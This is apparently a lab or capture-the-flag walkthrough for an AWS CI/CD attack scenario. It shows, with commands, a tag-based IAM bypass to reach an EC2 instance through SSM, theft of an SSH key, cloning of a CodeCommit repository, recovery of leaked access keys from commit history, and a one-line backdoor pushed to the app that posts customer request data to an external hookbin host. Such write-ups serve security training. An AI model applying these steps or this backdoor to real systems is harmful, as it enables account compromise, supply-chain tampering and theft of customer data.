

## Step 1

You are given credentials of an initial IAM user. 

Using the AWS CLI or AWS Console (e.g. using `aws-vault add initial` then `aws-vault login initial --no-session`), note that the IAM policy attached to your user allows it to establish a SSM session on all EC2 instances tagged with `Environment=sandbox`, and to manage tags of all EC2 instances tagged with `Environment=dev`.

Check the running EC2 instances. You notice one is tagged with `Environment=dev`, and you therefore can't SSM to it. Instead, overwrite the `Environment` tag with the value `sandbox`, then establish a SSM session to the instance:

```
aws ec2 create-tags --resources i-xxxx --tags Key=Environment,Value=sandbox
aws ssm start-session --target i-xxxx
```

## Step 2

Once on the instance, notice the private SSH key stored at `/home/ssm-user/.ssh/id_rsa`. You can extract the corresponding public key fingerprint to notice it is linked to the CodeCommit credentials of the IAM user `cloner`, who has the permission `codecommit:GitPull` on a repository:

```
$ ssh-keygen -f .ssh/stolen_key -l -E md5
2048 MD5:be:5e:49:5e:e5:d0:66:bb:91:30:3f:66:2e:97:1a:11

$ aws iam list-ssh-public-keys --user-name cloner
{
  "SSHPublicKeys": [
    {
      "UserName": "cloner",
      "SSHPublicKeyId": "APKA254BBSGPK2B5K5YQ",
      "Status": "Active",
      "UploadDate": "2021-12-27T10:34:19+00:00"
    }
  ]
}
$ aws iam get-ssh-public-key --user-name cloner --ssh-public-key-id APKA254BBSGPK2B5K5YQ --encoding PEM --output text --query 'SSHPublicKey.Fingerprint' 
be:5e:49:5e:e5:d0:66:bb:91:30:3f:66
```

## Step 3

Set up your local environment to clone the repository using the [CodeCommit documentation](https://docs.aws.amazon.com/codecommit/latest/userguide/setting-up-ssh-unixes.html). In short:

- Copy the SSH key to your local machine (`.ssh/stolen_key`) and `chmod 700` it

- Find the CodeCommit user ID of `cloner` using `aws iam list-ssh-public-keys --user-name cloner --output text --query 'SSHPublicKeys[0].SSHPublicKeyId'`

- Use the following SSH configuration (in your `.ssh/config`):

```
Host *.amazonaws.com
	IdentityFile ~/.ssh/stolen_key
```

- Then, clone the repository using `git clone ssh://<SSH-KEY-ID>@git-codecommit.<REGION>.amazonaws.com/v1/repos/backend-api` (where `SSH-KEY-ID` should look like `APKA2...`)

## Step 4

The repository contains the backend code of the Lambda function exposed through the API gateway. Check the commit history to note a leaked access key:

```diff
commit 576bc9e2979cb780dacefa1cf758dabb29f6b223
Author: christophe <christophe>
Date:   Mon Dec 27 10:38:31 2021 +0000

    Use built-in AWS authentication instead of hardcoded keys

diff --git a/buildspec.yml b/buildspec.yml
index 7130465..4beaa61 100644
--- a/buildspec.yml
+++ b/buildspec.yml
@@ -1,22 +1,20 @@
-      version: 0.2
+version: 0.2
 phases:
   pre_build:
     commands:
-    - export AWS_ACCESS_KEY_ID=AKIA...
-    - export AWS_SECRET_ACCESS_KEY=hnOVW...dtX
     - echo "Authenticating to ECR"
```

## Step 5

These credentials you found belong to the user `developer`, who has pull and push access to this repository. Use this access to backdoor the application and steal the sensitive data that customers are sending to the API!

- For instance, add a piece of code that sends the secret data to an attacker-controlled server:

```diff
diff --git a/app.py b/app.py
index 10e7da5..e17a2ba 100644
--- a/app.py
+++ b/app.py
@@ -3,6 +3,7 @@ import json

 def handle(event):
   body = event.get('body')
+  import requests; requests.post("https://hookbin.com/kx9QGWGQMoUBjzggjga9", data=body)
   if body is None:
     return 400, "missing body"
```

- Commit the file and push it. The easiest is to use the AWS Console. You can also use the AWS CLI:

```
$ aws codecommit get-branch --repository-name backend-api  --branch-name master
{
    "branch": {
        "branchName": "master",
        "commitId": "e6a2c7fb17e3759d120404d2b0fe28b92c0a755e"
    }
}

$ aws codecommit put-file --repository-name backend-api --branch-name master --file-content fileb://./app.py --file-path app.py --parent-commit-id e6a2c7fb17e3759d120404d2b0fe28b92c0a755e
```


Note that the application is automatically being built by a CI/CD pipeline in CodePipeline. After a few minutes, your backdoored application will be deployed, and your attacker-controlled server will receive the flag!

